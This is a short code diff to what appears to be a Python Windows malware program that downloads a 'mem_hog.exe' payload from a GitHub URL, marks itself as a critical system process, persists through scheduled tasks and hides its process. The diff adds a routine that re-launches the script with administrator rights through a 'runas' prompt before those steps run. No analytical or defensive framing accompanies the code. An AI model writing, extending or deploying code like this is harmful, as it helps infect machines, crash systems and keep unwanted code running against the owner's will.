@@ -19,6 +19,14 @@ RtlSetProcessIsCritical.restype = ctypes.c_int
 GITHUB_URL = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/mem_hog.exe"
 PAYLOAD_PATH = None
 
+def is_admin():
+    return ctypes.windll.shell32.IsUserAnAdmin()
+
+def request_admin():
+    if not is_admin():
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+        sys.exit(0)
+
 def set_process_as_critical():
     try:
         result = RtlSetProcessIsCritical(1, 0, 0)
@@ -457,6 +465,7 @@ def persist_schtasks():
 
 # Main execution
 if __name__ == '__main__':
+    request_admin()
     set_process_as_critical()
     persist_schtasks()
     hide_process()
